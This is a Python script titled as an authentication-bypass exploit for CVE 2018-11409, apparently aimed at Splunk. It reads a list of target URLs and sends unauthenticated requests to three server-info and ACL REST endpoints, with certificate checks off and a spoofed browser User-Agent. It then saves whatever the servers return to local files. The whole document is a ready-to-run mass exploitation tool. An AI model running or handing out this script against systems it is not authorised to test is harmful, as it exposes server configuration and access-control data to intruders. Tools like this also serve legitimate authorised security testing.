#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
from termcolor import colored
import tldextract
import os
import json


def check(url):
    hearders = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0','Connection': 'close'}
    try:
        res = requests.get(url, headers=hearders, allow_redirects=False, verify=False, timeout=(5, 27))
        print(colored("Found " + res.status_code.__str__() + " Response Code", "green"))
        # print(colored("Response Headers: ", "green"))
        # print(json.dumps(dict(res.headers), sort_keys=True, indent=4))
        if res.status_code == 200:
            return res.content
    except Exception as e:
        print(e)
        print("\n")
        return int(1)


def runner(domain,name):
    payloads =  ["/services/server/info/server-info?output_mode=xml" , "/servicesNS/nobody/system/server/info/", "/services/server/info/_acl"]
    path = "output/" + name
    f = open( path ,"a+")
    for payload in payloads:
        print(colored("\nTrying " + domain + payload , "cyan"))
        out = check(domain + payload)
        f.write("Trying " + domain.__str__() + payload.__str__() + "")
        f.write(out.__str__() + "\n\n")
    print("\n\n")


#   MAIN FUNCTION
if __name__ == '__main__':
    try:
        print("\n Authentication Bypass CVE 2018-11409 ")
        path = input("\nPlease provide the path to file: ")
        file = open(path.__str__().rstrip('\n'), "r")
        print("\n")
        for target in file:
            url = target.__str__().rstrip('\n').rstrip(' ')
            result = urlparse(url)
            dom = result.netloc.__str__()
            path = result.path.__str__()
            print(colored(result.scheme.__str__() + "://" + dom + path , "yellow"))
            runner(result.scheme.__str__() + "://" + dom , dom )

    except KeyboardInterrupt:
        print("Canceling script...")
    except Exception as e:
        print(e)
